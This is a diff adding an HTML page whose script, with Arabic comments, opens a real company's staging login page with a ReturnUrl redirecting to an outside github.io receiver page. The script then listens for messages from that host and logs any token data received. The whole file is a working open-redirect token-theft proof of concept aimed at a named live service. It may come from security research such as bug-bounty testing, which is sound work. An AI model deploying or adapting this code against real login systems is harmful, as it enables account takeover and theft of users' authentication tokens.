@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// رابط تسجيل الدخول مع ReturnUrl يوجه لصفحة مستقبلة (مثلا receiver.html) على نفس النطاق
+var loginUrl = 'https://enterprise-hub-identity-stage.servicetitan.com/Account/Login?ReturnUrl=//fadyashraf44.github.io/receiver.html';
+var popup = window.open(loginUrl, 'loginPopup', 'width=600,height=700');
+
+window.addEventListener('message', function(event) {
+  // تأكد من المصدر (بعد ما تضبطه حسب المجال الصحيح)
+  if (event.origin === 'https://fadyashraf44.github.io') {
+    console.log('Received token data:', event.data);
+    // هنا ستظهر الرموز المؤقتة لو نجحت
+  }
+});
+</script>
+</body>
+</html>
